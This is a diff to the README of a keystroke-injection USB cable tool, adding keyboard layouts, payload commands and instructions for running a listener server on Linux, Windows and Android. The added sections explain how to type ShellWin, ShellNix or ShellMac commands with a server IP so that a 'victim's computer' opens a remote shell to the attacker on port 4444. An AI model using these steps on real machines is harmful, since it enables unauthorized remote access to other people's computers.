@@ -54,6 +54,9 @@ You can invite me to a coffee to further develop low-cost hacking devices. If yo
 	* Payload Syntax
 	* Keys and Modifiers Syntax
 6. Remote Shell
+	* Linux/iOS Server
+	* Windows Server
+	* Android Server
 
 ![Cable](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/cable.jpg)
 
@@ -85,8 +88,13 @@ Evil Crow Cable Wind is pre-configured with English layout (EN_US), but is compa
 * ES_ES
 * FR_FR
 * HR_HR
+* HU_HU
 * IT_IT
 * PT_PT
+* PT_BR
+* SK_SK
+* CZ_CZ
+* SV_SE
 
 You can change the keyboard layout in real time from the web panel.
 
@@ -296,6 +304,10 @@ If you want to add a new keyboard layout:
 
 ![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout.png)
 
+![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout1.png)
+
+![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout2.png)
+
 4. Modify config.h in firmware.ino to change to your new layout from the web panel.
 
 ![Web Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/web-layout.png)
@@ -310,6 +322,7 @@ To develop Evil Crow Cable Wind payloads, you need to know the syntax of the int
 
 | Command | Example | Description |
 | ------- | ------- | ----------- |
+| `ServerConnect` | `ServerConnect IP` |Read the "Remote Shell" section for more information |
 | `RunWin` | `RunWin cmd` |Runs a command or a program on the victim's computer |
 | `RunPowershellAdmin` | `RunPowershellAdmin` | Run powershell as administrator |
 | `RunCmdAdmin` | `RunCmdAdmin` | Run cmd as administrator |
@@ -318,6 +331,8 @@ To develop Evil Crow Cable Wind payloads, you need to know the syntax of the int
 | `RunLauncher` | `RunLauncher libreoffice` | Runs a command or a program on the victim's computer |
 | `CtrlAltT` | `CtrlAltT` | Run a terminal on the victim's computer |
 | `ShellNix` | `ShellNix IP` | Read the "Remote Shell" section for more information |
+| `ShellMac` | `ShellMac IP` | Read the "Remote Shell" section for more information |
+| `ShellMacCleanup` | `ShellMacCleanup` | Read the "Remote Shell" section for more information |
 | `RunMac` | `RunMac terminal` | Runs a command or a program on the victim's computer |
 | `GuiR` | `GuiR` | Press WINDOWS+R on the victim's computer |
 | `AltF2` | `AltF2` | Press ALT+F2 on the victim's computer |
@@ -406,10 +421,19 @@ Evil Crow Cable Wind uses port 4444 for communication. If you want to change thi
 
 ![Port](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/port.png)
 
+You have several ways to run Evil Crow Server.
+
+* Linux and iOS: evilcrow-server.py --port {PORT} --target {windows, linux or mac}
+* Android: evilcrow-server.apk (Install the APK on an android phone. Default port 4444)
+* Windows: evilcrow-server.exe --port {PORT}
+
+## Linux/iOS Server
+
 1. Run evilcrow-server.py to start the attack:
 
 	* Windows Target: python evilcrow-server.py --port 4444 --target windows
 	* Linux Target: python evilcrow-server.py --port 4444 --target linux
+	* MacOS Target: python evilcrow-server.py --port 4444 --target macos
 	
 ![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server.png)
 
@@ -417,8 +441,39 @@ Evil Crow Cable Wind uses port 4444 for communication. If you want to change thi
 
 	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
 	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
+	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
 	
 3. Click on 'Run Payload'.
+
+## Windows Server
+
+1. Run evilcrow-server.exe to start the attack:
+
+	* Windows, Linux or MacOS Target: python evilcrow-server.exe --port 4444
+
+2. Go to the web panel and type the following payload from Live Payload:
+
+	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
+	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
+	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
+	
+3. Click on 'Run Payload'.
+
+![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server-windows.png)
+
+## Android Server
+
+1. Open Evil Crow Server APP
+
+2. Go to the web panel and type the following payload from Live Payload:
+
+	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
+	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
+	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
+
+3. Click on 'Run Payload'.
+
+![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server-android.jpg)
 
 **Demo:** [Remote Shell](https://www.youtube.com/watch?v=FmkIHYdOxS4)
 
